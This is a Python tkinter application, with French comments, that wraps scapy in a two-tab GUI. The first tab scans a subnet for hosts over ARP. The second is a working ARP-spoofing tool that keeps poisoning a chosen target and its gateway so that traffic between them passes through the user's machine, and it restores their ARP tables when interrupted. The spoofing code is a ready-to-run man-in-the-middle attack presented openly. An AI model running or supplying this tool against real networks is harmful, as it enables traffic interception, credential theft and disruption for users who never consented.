import tkinter as tk
from tkinter import messagebox, scrolledtext
from tkinter import ttk  # Ajout de cette ligne
import scapy.all as scapy
import time


# Fonction pour envoyer une requête ARP à une plage d'adresses IP spécifiée
def send_arp_request(ip_range, result_text):
    arp_result = scapy.arping(ip_range, verbose=False)
    answered_list = arp_result[0]
    result_lines = []
    for result in answered_list:
        ip_src = result[1].psrc
        mac_src = result[1].hwsrc
        hostname = result[1].hostname if hasattr(result[1], 'hostname') and result[
            1].hostname is not None else "Unknown"
        result_line = f"{ip_src} {mac_src} {hostname}"
        result_lines.append(result_line)
    result_str = "\n".join(result_lines)
    result_text.config(state=tk.NORMAL)
    result_text.delete("1.0", tk.END)
    result_text.insert(tk.END, result_str)
    result_text.config(state=tk.DISABLED)


class ARP_ToolApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("ARP Tool")
        self.geometry("800x600")
        self.create_widgets()

    def create_widgets(self):
        # Tabs configuration
        self.tab_control = ttk.Notebook(self)
        self.scan_tab = tk.Frame(self.tab_control)
        self.spoof_tab = tk.Frame(self.tab_control)

        self.tab_control.add(self.scan_tab, text="ARP Scan")
        self.tab_control.add(self.spoof_tab, text="ARP Spoof")
        self.tab_control.pack(expand=1, fill="both")

        # ARP Scan Widgets
        self.scan_header = tk.Label(self.scan_tab, text="ARP Scanner", font=("Arial", 16, "bold"))
        self.scan_header.pack(pady=10)

        self.ip_range_label = tk.Label(self.scan_tab, text="Enter IP address range (e.g., 192.168.1.0/24):")
        self.ip_range_label.pack()
        self.ip_range_entry = tk.Entry(self.scan_tab, width=50)
        self.ip_range_entry.pack()

        self.scan_button = tk.Button(self.scan_tab, text="Scan",
                                     command=lambda: send_arp_request(self.ip_range_entry.get(), self.scan_result_text))
        self.scan_button.pack(pady=10)

        self.scan_result_text = scrolledtext.ScrolledText(self.scan_tab, wrap=tk.WORD, width=80, height=20)
        self.scan_result_text.pack(padx=10, pady=10)

        # ARP Spoof Widgets
        self.spoof_header = tk.Label(self.spoof_tab, text="ARP Spoofing", font=("Arial", 16, "bold"))
        self.spoof_header.pack(pady=10)

        self.label_target = tk.Label(self.spoof_tab, text="Target IP:")
        self.label_target.pack(pady=5)
        self.entry_target = tk.Entry(self.spoof_tab, width=30)
        self.entry_target.pack()

        self.label_gateway = tk.Label(self.spoof_tab, text="Gateway IP:")
        self.label_gateway.pack(pady=5)
        self.entry_gateway = tk.Entry(self.spoof_tab, width=30)
        self.entry_gateway.pack()

        self.spoof_button = tk.Button(self.spoof_tab, text="Start Spoofing", command=self.start_spoofing)
        self.spoof_button.pack(pady=10)

        self.spoof_result_text = scrolledtext.ScrolledText(self.spoof_tab, width=40, height=15)
        self.spoof_result_text.pack(pady=10)

    def get_arguments(self):
        target = self.entry_target.get()
        gateway = self.entry_gateway.get()
        if not all([target, gateway]):
            messagebox.showwarning("Warning", "Please enter both target and gateway IP addresses.")
            return None, None
        return target, gateway

    def get_mac(self, ip):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet / arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.sendp(packet, verbose=False, count=4)

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(packet, verbose=False)

    def start_spoofing(self):
        target_ip, gateway_ip = self.get_arguments()
        if not target_ip or not gateway_ip:
            return

        self.spoof_result_text.delete('1.0', tk.END)
        sent_packets = 0
        try:
            while True:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                sent_packets += 2
                self.spoof_result_text.insert(tk.END, f"[+] Sent packets: {sent_packets}\n")
                self.spoof_result_text.see(tk.END)
                self.update_idletasks()
                time.sleep(2)

        except KeyboardInterrupt:
            self.spoof_result_text.insert(tk.END, "\n[-] Ctrl + C detected. Restoring ARP Tables Please Wait!\n")
            self.spoof_result_text.see(tk.END)
            self.update_idletasks()
            self.restore(target_ip, gateway_ip)
            self.restore(gateway_ip, target_ip)


if __name__ == "__main__":
    app = ARP_ToolApp()
    app.mainloop()

